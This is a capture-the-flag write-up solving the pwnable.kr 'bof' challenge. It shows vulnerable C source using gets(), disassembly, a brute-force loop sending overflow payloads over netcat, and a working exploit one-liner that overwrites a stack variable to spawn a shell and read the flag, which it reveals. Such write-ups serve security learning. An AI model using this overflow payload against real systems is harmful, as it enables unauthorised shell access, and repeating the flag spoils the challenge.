## Question

> Nana told me that buffer overflow is one of the most common software vulnerability.
>
> Is that true?
> 
> Download : http://pwnable.kr/bin/bof
>
> Download : http://pwnable.kr/bin/bof.c
> 
> Running at : nc pwnable.kr 9000

<button class="section" target="solution" show="Show solution" hide="Hide solution"></button>

<!--sec data-title="Solution" data-id="solution" data-show=false ces-->

### Step 1: What the hell is `nc`?

I had no idea what `nc` was, so I ran `man nc`... Not very helpful:

```
DESCRIPTION
    The nc (or netcat) utility is used for just about anything under the sun
    involving TCP or UDP.  It can open TCP connections, send UDP packets, lis-
    ten on arbitrary TCP and UDP ports, do port scanning, and deal with both
    IPv4 and IPv6.  Unlike telnet(1), nc scripts nicely, and separates error
    messages onto standard error instead of sending them to standard output, as
    telnet(1) does with some.

    Common uses include:

        o   simple TCP proxies
        o   shell-script based HTTP clients and servers
        o   network daemon testing
        o   a SOCKS or HTTP ProxyCommand for ssh(1)
        o   and much, much more
```

OK, so it could be anything??? After running the `nc pwnable.kr 9000`, nothing seem to happen, until you enter something:

```bash
$> nc pwnable.kr 9000
WTF? # This is my input :)
overflow me :
Nah..
```

So I need to enter something, and there must be something running there.

### Step 1.5: See what is inside other files

This is the content of the `bof.c`

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);       // smash me!
    if(key == 0xcafebabe){
        system("/bin/sh");
    }
    else{
        printf("Nah..\n");
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

I am assuming that's the file that is responding to us from the `nc ...`.
And it has abuffer...
That could be overflown...
Nice! :)

Also notice that if we get in the `if` statement, we will have access to the `/bin/sh`.

### Step 2: Get inside the executable!

There is a compiled executable, and after quick look around, it appears to be an ELF file.
Well, that's a bummer, because I cannot run ELF files on my machine + it was compiled on a different one:)):
Also, GDB on OS X is not very useful for the ELF files.

```bash
$> file bof
bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, not stripped
$> chmod +x bof
$> ./bof
-bash: ./bof: cannot execute binary file: Exec format error
$> gdb bof
GNU gdb (GDB) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
[...]
"bof": not in executable format: File format not recognized
(gdb) file bof
"bof": not in executable format: File format not recognized
(gdb) exec-file bof
"bof": not in executable format: File format not recognized
(gdb) q
$>
```

Let's try LLDB - If you are not on OS X, [here is the cheat sheet for converting between LLDB and GDB](http://lldb.llvm.org/lldb-gdb.html).

```
$> lldb bof
(lldb) di -n func
bof`func:
bof[0x62c] <+0>:  pushl  %ebp
bof[0x62d] <+1>:  movl   %esp, %ebp
bof[0x62f] <+3>:  subl   $0x48, %esp
bof[0x632] <+6>:  movl   %gs:0x14, %eax
bof[0x638] <+12>: movl   %eax, -0xc(%ebp)
bof[0x63b] <+15>: xorl   %eax, %eax
bof[0x63d] <+17>: movl   $0x78c, (%esp)            ; imm = 0x78C
bof[0x644] <+24>: calll  0x645                     ; <+25>
bof[0x649] <+29>: leal   -0x2c(%ebp), %eax
bof[0x64c] <+32>: movl   %eax, (%esp)
bof[0x64f] <+35>: calll  0x650                     ; <+36>
bof[0x654] <+40>: cmpl   $0xcafebabe, 0x8(%ebp)    ; imm = 0xCAFEBABE
bof[0x65b] <+47>: jne    0x66b                     ; <+63>
bof[0x65d] <+49>: movl   $0x79b, (%esp)            ; imm = 0x79B
bof[0x664] <+56>: calll  0x665                     ; <+57>
bof[0x669] <+61>: jmp    0x677                     ; <+75>
bof[0x66b] <+63>: movl   $0x7a3, (%esp)            ; imm = 0x7A3
bof[0x672] <+70>: calll  0x673                     ; <+71>
bof[0x677] <+75>: movl   -0xc(%ebp), %eax
bof[0x67a] <+78>: xorl   %gs:0x14, %eax
bof[0x681] <+85>: je     0x688                     ; <+92>
bof[0x683] <+87>: calll  0x684                     ; <+88>
bof[0x688] <+92>: leave
bof[0x689] <+93>: retl

(lldb) di -n main
bof`main:
bof[0x68a] <+0>:  pushl  %ebp
bof[0x68b] <+1>:  movl   %esp, %ebp
bof[0x68d] <+3>:  andl   $-0x10, %esp
bof[0x690] <+6>:  subl   $0x10, %esp
bof[0x693] <+9>:  movl   $0xdeadbeef, (%esp)       ; imm = 0xDEADBEEF
bof[0x69a] <+16>: calll  0x62c                     ; func
bof[0x69f] <+21>: movl   $0x0, %eax
bof[0x6a4] <+26>: leave
bof[0x6a5] <+27>: retl

(lldb) 
```

Note that the `0xCAFEBABE` and `0xDEADBEEF` are written to some addresses. 
We probably need to change one of them.
However, I couldn't get the file to run on my OS X, and I was too lazy to get the virtual machine, and I am bad at LLDB/GDM/R2, so we will do the bruteforce approach :)


### Step 3: Get the offset!

We will flood the buffer with this string:

```python
python -c "print 'Z'*n + '\xbe\xba\xfe\xca\n'"
```

where `n>32` -- and we will see what the reponse would be. 
Because our assumption is that the program will run the `/bin/sh`, we can run `echo` on it to indicate that we found a right offset :)))


```bash
for i in `seq 33 100`; do
    echo =====$i======
    (python -c "print 'Z'*$i + '\xbe\xba\xfe\xca\n'"; sleep 1; echo "echo STAAAHHHP") | nc pwnable.kr 9000;
done
```

After 10-15 seconds, results is:

```
[...]
*** stack smashing detected ***: /home/bof/bof terminated
=====50======
*** stack smashing detected ***: /home/bof/bof terminated
=====51======
*** stack smashing detected ***: /home/bof/bof terminated
=====52======
STAAAHHHP
*** stack smashing detected ***: /home/bof/bof terminated
=====53======
*** stack smashing detected ***: /home/bof/bof terminated
=====54======
*** stack smashing detected ***: /home/bof/bof terminated
^C
```

Now we know that the offset is 52! :)))

### Step 4: Grab the flag

Now use the offset and `cat -` to access the shell

```bash
$> (python -c "print 'Z'*52 + '\xbe\xba\xfe\xca\n'"; cat -) | nc pwnable.kr 9000
ls # This is my input -- there is no prompt
bof
bof.c
flag
log
super.pl
cat flag # This is my input -- there is no prompt
daddy, I just pwned a buFFer :)
exit # This is my input -- there is no prompt
*** stack smashing detected ***: /home/bof/bof terminated

```

### Flag

`daddy, I just pwned a buFFer :)`
<!--endsec-->


